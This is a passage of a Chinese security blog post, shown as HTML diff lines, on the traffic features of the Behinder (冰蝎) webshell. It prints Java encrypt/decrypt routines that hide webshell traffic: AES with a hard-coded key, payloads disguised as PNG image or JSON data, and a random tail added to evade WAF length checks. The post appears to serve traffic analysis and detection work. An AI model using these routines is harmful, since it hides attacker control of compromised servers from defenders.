class="hljs-keyword">throws</span> Exception<br>&#123;<br>    String key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>    <span class="hljs-type">byte</span>[] raw = key.getBytes(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>    javax.crypto.spec.<span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">skeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(raw, <span class="hljs-string">&quot;AES&quot;</span>);<br>    javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span>javax.crypto.Cipher.getInstance(<span class="hljs-string">&quot;AES/ECB/PKCS5Padding&quot;</span>);<span class="hljs-comment">// &quot;算法/模式/补码方式&quot;</span><br>    cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);<br>    <span class="hljs-type">byte</span>[] encrypted = cipher.doFinal(data);<br>    Class baseCls;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        baseCls=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>        Object Encoder=baseCls.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(baseCls, <span class="hljs-literal">null</span>);<br>        encrypted= (<span class="hljs-type">byte</span>[]) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;encrypted&#125;);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Throwable error)<br>    &#123;<br>        baseCls=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>        Object Encoder=baseCls.newInstance();<br>        String result=(String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;encrypted&#125;);<br>        result=result.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        encrypted=result.getBytes();<br>    &#125;<br>    <span class="hljs-keyword">return</span> encrypted;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>    javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="hljs-string">&quot;AES/ECB/PKCS5Padding&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<br>    <span class="hljs-type">byte</span>[] decodebs;<br>    Class baseCls ;<br>            <span class="hljs-keyword">try</span>&#123;<br>                baseCls=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>                Object Decoder=baseCls.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(baseCls, <span class="hljs-literal">null</span>);<br>                decodebs=(<span class="hljs-type">byte</span>[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;data&#125;);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Throwable e)<br>            &#123;<br>                baseCls = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                Object Decoder=baseCls.newInstance();<br>                decodebs=(<span class="hljs-type">byte</span>[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(Decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data)&#125;);<br><br>            &#125;<br>    <span class="hljs-keyword">return</span> c.doFinal(decodebs);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>default_image  伪造成图片数据传输，就是在<code>content</code>后拼接payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>        String content=<span class="hljs-string">&quot;iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAAABAAAAWgAAAAAAAABIAAAAAQAAAEgAAAABAAOgAQADAAAAAQABAACgAgAEAAAAAQAAABSgAwAEAAAAAQAAAA4AAAAAa7cS3QAAAAlwSFlzAAALEwAACxMBAJqcGAAAAVlpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KGV7hBwAAAXZJREFUOBGNVE1Lw0AQfRtNRfFUKyqp6E160bSlKv4SwZMeevHqH/EgxaOC/hVbMBoR/LhaP5DWXrxoajbu7LKyaZPUhYQJ897b2TezYZFYGLEiKAgDG4EErCwECYU8VBChSbEWT+OxtAqpcMaSK8rKjSftpAk84mg9X8Hv3kuYWyhhs1iVG2nMIH+oQg2k4x37Z9h/OkE5tyC8YfCCFzSWdlF3d2AxCxpriqYKXrQvseUdYHu6iiD6ARfuTbEczj9baNYOsVGsJArGmkKGa99uu4/Ij+Xl5l88wDfvg2Qdew5+504VlWBxTNAsXc+S4qiBoVgPkIk145gg0cgXWquFFfTCnjzqpGVjQjzk42v/He5sSWnoXdWXfCd2mTLrThlHnT3RlFO49rywArgO3tBYrqPmuIZEPBxqCqV192hsmm0PNx8PkrU2I8ZmsZLaYQIlClJCi1I8uLJyMQ9NInWbiH9XTyTl1cu4QcRPrdAU1/f3Pz+HX/qNrcYjTeaNAAAAAElFTkSuQmCC&quot;</span>;<br>        java.io.ByteArrayOutputStream bos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br>        bos.write(java.util.Base64.getDecoder().decode(content));<br>        bos.write(data);<br>        <span class="hljs-keyword">return</span> bos.toByteArray();<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>        java.io.ByteArrayOutputStream bos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br>        bos.write(data,<span class="hljs-number">966</span>,data.length-<span class="hljs-number">966</span>);<br>        <span class="hljs-keyword">return</span> bos.toByteArray();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>default_json 伪造成json传输，在json后面拼接payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    String json=<span class="hljs-string">&quot;&#123;\&quot;id\&quot;:\&quot;1\&quot;,\&quot;body\&quot;:&#123;\&quot;user\&quot;:\&quot;lucky\&quot;&#125;&#125;&quot;</span>;<br>    json=json.replace(<span class="hljs-string">&quot;lucky&quot;</span>,java.util.Base64.getEncoder().encodeToString(data).replace(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>).replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>));<br>    <span class="hljs-keyword">return</span> json.getBytes();<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    java.io.ByteArrayOutputStream bos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br>    bos.write(data,<span class="hljs-number">26</span>,data.length-<span class="hljs-number">29</span>);<br>    <span class="hljs-keyword">return</span> java.util.Base64.getDecoder().decode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bos.toByteArray()).replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>));<br>    <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>aes_with_magic  <code>AES-128 ECB  无IV</code>但是在尾部拼接随机<code>magicNum</code>，绕过waf长度检测</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        String key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>        <span class="hljs-comment">//key=&quot;34192114c8d05df8&quot;;</span><br>        <span class="hljs-type">byte</span>[] raw = key.getBytes(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        javax.crypto.spec.<span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">skeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(raw, <span class="hljs-string">&quot;AES&quot;</span>);<br>        javax.crypto.<span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span>javax.crypto.Cipher.getInstance(<span class="hljs-string">&quot;AES/ECB/PKCS5Padding&quot;</span>);<span class="hljs-comment">// &quot;绠楁硶/妯″紡/琛ョ爜鏂瑰紡&quot;</span><br>        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);<br>        <span class="hljs-type">byte</span>[] encrypted = cipher.doFinal(data);<br>        Class baseCls;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            baseCls=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            Object Encoder=baseCls.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(baseCls, <span class="hljs-literal">null</span>);<br>            encrypted= (<span class="hljs-type">byte</span>[]) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;encrypted&#125;);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Throwable error)<br>        &#123;<br>            baseCls=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>            Object Encoder=baseCls.newInstance();<br>            String result=(String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;encrypted&#125;);<br>            result=result.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>            encrypted=result.getBytes();<br>        &#125;<br>        <span class="hljs-comment">//澧炲姞榄旀硶灏惧反</span><br>        <span class="hljs-type">int</span> magicNum=Integer.parseInt(key.substring(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)%<span class="hljs-number">16</span>;<br>		java.util.Random random=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Random();<br>		<span class="hljs-type">byte</span>[] buf=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[magicNum];<br>		<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;buf.length;i++)<br>		&#123;<br>			buf[i]=(<span class="hljs-type">byte</span>)random.nextInt(<span class="hljs-number">256</span>);<br>		&#125;<br>        java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br>		output.write(encrypted);<br>		output.write(buf);<br>		<span class="hljs-keyword">return</span> output.toByteArray();<br>    &#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>    <span class="hljs-type">int</span> magicNum=Integer.parseInt(k.substring(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)%<span class="hljs-number">16</span>; <span class="hljs-comment">//鍙杕agic tail闀垮害</span><br>    data=java.util.Arrays.copyOfRange(data,<span class="hljs-number">0</span>,data.length-magicNum); <span class="hljs-comment">//鎴帀magic tail</span><br>    javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="hljs-string">&quot;AES/ECB/PKCS5Padding&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<br>    <span class="hljs-type">byte</span>[] decodebs;<br>    Class baseCls ;<br>            <span class="hljs-keyword">try</span>&#123;<br>                baseCls=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>                Object Decoder=baseCls.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(baseCls, <span class="hljs-literal">null</span>);<br>                decodebs=(<span class="hljs-type">byte</span>[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;data&#125;);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Throwable e)<br>            &#123;<br>                baseCls = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                Object Decoder=baseCls.newInstance();<br>                decodebs=(<span class="hljs-type">byte</span>[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(Decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data)&#125;);<br><br>            &#125;<br>    <span class="hljs-keyword">return</span> c.doFinal(decodebs);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%A0%94%E7%A9%B6/" class="category-chain-item">研究</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%A0%94%E7%A9%B6/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>冰蝎webshell流量特征</div>
+      <div>http://example.com/2025/12/07/冰蝎/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/12/07/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80/" title="JAVA内存马查杀">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JAVA内存马查杀</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/27/%E7%AC%AC16%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-web/" title="第16届极客大挑战-web">
+                        <span class="hidden-mobile">第16届极客大挑战-web</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <!--音乐--> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script> <div id="player" class="aplayer aplayer-withlist aplayer-fixed" data-id="9723733050" data-server="netease" data-type="playlist" autoplay="true" data-order="list"  data-fixed="true" data-listfolded="true" data-theme="#2D8CF0"></div> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon<br /> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
